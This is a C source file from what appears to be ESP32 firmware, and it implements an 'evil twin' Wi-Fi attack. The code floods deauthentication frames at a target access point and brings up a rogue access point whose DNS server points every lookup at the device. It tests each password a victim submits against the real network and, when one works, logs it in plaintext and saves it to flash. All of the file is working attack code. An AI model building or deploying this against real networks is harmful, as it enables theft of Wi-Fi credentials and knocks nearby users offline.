#include "evil_twin_manager.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "lwip/sockets.h"
#include <string.h>
#include <arpa/inet.h>

#include "attack_manager.h"
#include "wifi_manager.h"
#include "packet_handler.h"
#include "filesystem_manager.h"

static const char *TAG = "EVIL_TWIN_MANAGER";
static bool is_active = false;
static evil_twin_verify_state_t verification_state = VERIFY_STATE_IDLE;
static char submitted_password[64];
static TaskHandle_t evil_twin_task_handle = NULL;
static TaskHandle_t dns_server_task_handle = NULL;

static EventGroupHandle_t wifi_event_group;
const int WIFI_CONNECTED_BIT = BIT0;
const int WIFI_FAIL_BIT = BIT1;

typedef struct {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
} __attribute__((packed)) DnsHeader;

static void dns_server_task(void *pvParameters) {
    uint8_t rx_buffer[128];
    struct sockaddr_in dest_addr;
    dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(53);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock < 0) {
        ESP_LOGE(TAG, "Unable to create DNS socket");
        vTaskDelete(NULL);
        return;
    }

    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

    if (bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
        ESP_LOGE(TAG, "Socket bind failed");
        close(sock);
        vTaskDelete(NULL);
        return;
    }

    ESP_LOGI(TAG, "DNS Server started.");
    while (is_active) {
        struct sockaddr_in source_addr;
        socklen_t socklen = sizeof(source_addr);
        int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer), 0, (struct sockaddr *)&source_addr, &socklen);
        if (len > 0) {
            DnsHeader *dns_header = (DnsHeader *)rx_buffer;
            if (dns_header->flags & 0x8000) continue;

            dns_header->flags = htons(0x8180);
            dns_header->ancount = htons(1);

            uint8_t *query_end = rx_buffer + sizeof(DnsHeader);
            while (*query_end != 0 && (query_end - rx_buffer) < len) {
                query_end++;
            }

            if ((query_end - rx_buffer) + 5 < sizeof(rx_buffer)) {
                uint8_t *answer = query_end + 5;

                *answer++ = 0xc0;
                *answer++ = 0x0c;
                *answer++ = 0x00;
                *answer++ = 0x01;
                *answer++ = 0x00;
                *answer++ = 0x01;
                *answer++ = 0x00;
                *answer++ = 0x00; *answer++ = 0x00; *answer++ = 0x3c;
                *answer++ = 0x00;
                *answer++ = 0x04;
                *answer++ = 192;
                *answer++ = 168; *answer++ = 4; *answer++ = 1;

                sendto(sock, rx_buffer, (answer - rx_buffer), 0, (struct sockaddr *)&source_addr, socklen);
            }
        }
        taskYIELD();
    }
    close(sock);
    dns_server_task_handle = NULL;
    vTaskDelete(NULL);
}

static void verification_event_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data) {
    if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        if (verification_state == VERIFY_STATE_IN_PROGRESS) {
            xEventGroupSetBits(wifi_event_group, WIFI_FAIL_BIT);
        }
    }
}

static void verification_task(void *pvParameters) {
    ESP_LOGI(TAG, "Verifying password: %s", submitted_password);

    packet_handler_stop_deauth();

    xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT | WIFI_FAIL_BIT);
    wifi_manager_connect_sta(submitted_password);

    EventBits_t bits = xEventGroupWaitBits(wifi_event_group,
                                           WIFI_CONNECTED_BIT | WIFI_FAIL_BIT,
                                           pdFALSE, pdFALSE, pdMS_TO_TICKS(15000));

    if (bits & WIFI_CONNECTED_BIT) {
        ESP_LOGI(TAG, "Password Correct! Attack success.");

        verification_state = VERIFY_STATE_SUCCESS;

        char ssid[33], bssid[18];
        wifi_manager_get_target(ssid, bssid);
        filesystem_manager_save_credentials_json(ssid, bssid, submitted_password);

        vTaskDelay(pdMS_TO_TICKS(5000));

        ESP_LOGI(TAG, "Shutting down Evil Twin and restoring original AP...");
        wifi_manager_disconnect_sta();

        evil_twin_manager_stop();

    } else {
        ESP_LOGI(TAG, "Password Incorrect or Connection Failed.");
        verification_state = VERIFY_STATE_FAIL;
        wifi_manager_disconnect_sta();

        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        uint8_t target_mac[6];
        char bssid_str[18];
        wifi_manager_get_target(NULL, bssid_str);
        sscanf(bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &target_mac[0], &target_mac[1], &target_mac[2],
               &target_mac[3], &target_mac[4], &target_mac[5]);
        packet_handler_start_deauth(broadcast, target_mac);
    }

    vTaskDelete(NULL);
}

static void evil_twin_task(void *pvParameters) {

    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    char target_bssid_str[18];
    uint8_t target_bssid_mac[6];

    wifi_manager_get_target(NULL, target_bssid_str);
    sscanf(target_bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &target_bssid_mac[0], &target_bssid_mac[1], &target_bssid_mac[2],
           &target_bssid_mac[3], &target_bssid_mac[4], &target_bssid_mac[5]);

    packet_handler_start_deauth(broadcast_mac, target_bssid_mac);
    xTaskCreate(dns_server_task, "dns_server", 4096, NULL, 5, &dns_server_task_handle);

    wifi_event_group = xEventGroupCreate();
    esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &verification_event_handler, NULL, NULL);
    esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP, &verification_event_handler, NULL, NULL);

    while (is_active) {
        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    esp_event_handler_instance_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, &verification_event_handler);
    esp_event_handler_instance_unregister(IP_EVENT, IP_EVENT_STA_GOT_IP, &verification_event_handler);
    vEventGroupDelete(wifi_event_group);

    packet_handler_stop_deauth();
    wifi_manager_restore_softap();
    attack_manager_set_state(ATTACK_STATE_IDLE);
    evil_twin_task_handle = NULL;
    vTaskDelete(NULL);
}

esp_err_t evil_twin_manager_init(void) {
    is_active = false;
    verification_state = VERIFY_STATE_IDLE;
    return ESP_OK;
}

esp_err_t evil_twin_manager_start(void) {
    if (is_active) return ESP_ERR_INVALID_STATE;
    if (!wifi_manager_has_target()) return ESP_FAIL;

    is_active = true;
    verification_state = VERIFY_STATE_IDLE;
    attack_manager_set_state(ATTACK_STATE_EVIL_TWIN);

    wifi_manager_start_evil_twin_ap();

    xTaskCreate(evil_twin_task, "evil_twin_task", 4096, NULL, 10, &evil_twin_task_handle);
    return ESP_OK;
}

esp_err_t evil_twin_manager_stop(void) {
    is_active = false;
    return ESP_OK;
}

bool evil_twin_manager_is_running(void) {
    return is_active;
}

void evil_twin_manager_handle_password_submission(const char *password) {
    if (verification_state == VERIFY_STATE_IN_PROGRESS) return;
    strncpy(submitted_password, password, sizeof(submitted_password) - 1);
    verification_state = VERIFY_STATE_IN_PROGRESS;
    xTaskCreate(verification_task, "verify_pw_task", 4096, NULL, 5, NULL);
}

evil_twin_verify_state_t evil_twin_manager_get_verification_status(void) {
    return verification_state;
}
